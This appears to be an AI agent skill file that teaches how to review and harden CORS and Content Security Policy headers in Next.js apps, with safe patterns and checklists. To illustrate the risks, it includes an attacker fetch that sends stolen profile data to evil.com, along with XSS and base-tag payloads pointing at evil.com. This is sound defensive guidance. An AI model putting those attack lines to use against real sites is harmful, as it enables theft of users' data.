---
name: cors-and-csp-hardening
description: CORS (Cross-Origin Resource Sharing) and CSP (Content Security Policy) configuration review and hardening for Next.js applications. Use when reviewing security headers, API route CORS configuration, middleware header injection, next.config.js headers, or any frontend security policy. Covers CORS misconfigurations that enable cross-origin data theft, CSP bypasses that enable XSS, header injection, clickjacking prevention, and the complete security headers checklist for production Next.js + Vercel deployments.
---

# CORS & CSP Hardening

## CORS — What Goes Wrong

### The Attack: CORS Misconfiguration → Cross-Origin Data Theft
If your API responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, any website can make authenticated requests to your API and read the responses.

```javascript
// Attacker's site (evil.com)
fetch('https://your-api.com/api/user/profile', {
  credentials: 'include'  // Sends victim's cookies
})
.then(r => r.json())
.then(data => {
  // If CORS allows it, attacker reads victim's profile
  fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) })
})
```

### Dangerous CORS Patterns

```typescript
// CRITICAL — allows any origin with credentials
res.setHeader('Access-Control-Allow-Origin', '*')
res.setHeader('Access-Control-Allow-Credentials', 'true')
// Note: browsers block this specific combo, but other misconfigs are exploitable

// CRITICAL — reflects Origin header without validation
const origin = req.headers.origin
res.setHeader('Access-Control-Allow-Origin', origin)  // Reflects ANY origin
res.setHeader('Access-Control-Allow-Credentials', 'true')

// DANGEROUS — regex bypass
const allowedPattern = /\.example\.com$/
if (allowedPattern.test(origin)) { ... }
// Attacker uses: evil-example.com (matches the regex!)

// DANGEROUS — null origin allowed
if (origin === 'null') { res.setHeader('Access-Control-Allow-Origin', 'null') }
// Attacker can send requests with null origin via sandboxed iframe

// DANGEROUS — substring check
if (origin.includes('example.com')) { ... }
// Attacker uses: example.com.evil.com
```

### Safe CORS Pattern
```typescript
// next.config.js or middleware
const ALLOWED_ORIGINS = new Set([
  'https://your-app.com',
  'https://www.your-app.com',
  'https://staging.your-app.com',
])

// In development only
if (process.env.NODE_ENV === 'development') {
  ALLOWED_ORIGINS.add('http://localhost:3000')
}

export function middleware(request: NextRequest) {
  const origin = request.headers.get('origin')
  const response = NextResponse.next()
  
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    response.headers.set('Access-Control-Allow-Origin', origin)
    response.headers.set('Access-Control-Allow-Credentials', 'true')
    response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
    response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization')
    response.headers.set('Access-Control-Max-Age', '86400')
  }
  
  // Handle preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: response.headers })
  }
  
  return response
}
```

### CORS Review Checklist
- [ ] No `Access-Control-Allow-Origin: *` with credentials
- [ ] Origin not reflected without strict whitelist validation
- [ ] Whitelist uses exact match (Set), not regex or substring
- [ ] `null` origin not in whitelist
- [ ] `Access-Control-Allow-Methods` restricted to needed methods
- [ ] `Access-Control-Allow-Headers` restricted to needed headers
- [ ] Preflight (OPTIONS) handled correctly
- [ ] CORS not set on endpoints that don't need cross-origin access

## CSP — Content Security Policy

### What CSP Prevents
CSP tells the browser what sources are allowed for scripts, styles, images, connections, etc. A strong CSP makes XSS exploitation significantly harder — even if an attacker injects a `<script>` tag, the browser blocks it if the source isn't allowed.

### The Problem Without CSP
```html
<!-- Attacker injects via stored XSS -->
<script src="https://evil.com/stealer.js"></script>
<!-- Without CSP: browser executes it -->
<!-- With CSP: browser blocks it (source not in script-src) -->
```

### Next.js CSP Configuration
```typescript
// middleware.ts
import { NextResponse } from 'next/server'

export function middleware(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64')
  
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,  // Nonce for inline scripts
    `style-src 'self' 'unsafe-inline'`,     // Tailwind needs inline styles
    `img-src 'self' data: blob: https://*.supabase.co`,
    `font-src 'self'`,
    `connect-src 'self' https://*.supabase.co wss://*.supabase.co`,
    `frame-ancestors 'none'`,               // Prevent clickjacking
    `base-uri 'self'`,                      // Prevent base tag hijacking
    `form-action 'self'`,                   // Prevent form action hijacking
    `object-src 'none'`,                    // Block Flash/plugins
    `upgrade-insecure-requests`,
  ].join('; ')
  
  const response = NextResponse.next()
  response.headers.set('Content-Security-Policy', csp)
  response.headers.set('x-nonce', nonce)  // Pass nonce to components
  
  return response
}
```

### CSP Bypasses to Watch For
| Bypass | How It Works | Prevention |
|--------|-------------|------------|
| `'unsafe-inline'` in script-src | Attacker injects `<script>alert(1)</script>` | Use nonces instead |
| `'unsafe-eval'` in script-src | Attacker uses `eval()` via DOM manipulation | Remove in production |
| Wildcard CDN in script-src | Attacker hosts payload on allowed CDN (e.g., `cdn.jsdelivr.net`) | Specific paths, not wildcards |
| `data:` in script-src | `<script src="data:text/javascript,alert(1)">` | Don't allow `data:` for scripts |
| JSONP endpoints on allowed origins | Attacker uses JSONP callback to inject scripts | Remove JSONP, use proper CORS |
| base-uri not set | Attacker injects `<base href="https://evil.com">` → all relative URLs resolve to attacker | Always set `base-uri 'self'` |

### CSP Review Checklist
- [ ] CSP header present on all pages
- [ ] No `'unsafe-inline'` in `script-src` (use nonces)
- [ ] No `'unsafe-eval'` in `script-src` (remove in production)
- [ ] No wildcard (`*`) in `script-src` or `connect-src`
- [ ] `frame-ancestors 'none'` or `'self'` (prevent clickjacking)
- [ ] `base-uri 'self'` (prevent base tag hijacking)
- [ ] `object-src 'none'` (block plugins)
- [ ] `form-action 'self'` (prevent form hijacking)
- [ ] Trusted CDNs use specific paths, not entire domains
- [ ] Report-uri or report-to configured for violation monitoring

## Complete Security Headers

```typescript
// next.config.js
const securityHeaders = [
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-XSS-Protection', value: '0' },  // Disabled — CSP is better
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()' },
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },
  { key: 'Cross-Origin-Embedder-Policy', value: 'require-corp' },
  { key: 'Cross-Origin-Resource-Policy', value: 'same-origin' },
]

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }]
  },
}
```

### Header Review Checklist
- [ ] `Strict-Transport-Security` present with long max-age
- [ ] `X-Content-Type-Options: nosniff` prevents MIME sniffing
- [ ] `X-Frame-Options: DENY` prevents clickjacking (belt with CSP suspenders)
- [ ] `Referrer-Policy` limits referrer leakage
- [ ] `Permissions-Policy` disables unused browser features
- [ ] No `X-Powered-By` header (Next.js removes by default, verify)
- [ ] No `Server` header leaking server software version
- [ ] CSP configured per above

## References

For XSS prevention via input handling, see the existing security review skills.
For SSRF via CORS misconfiguration, see `ssrf-exploitation` skill.
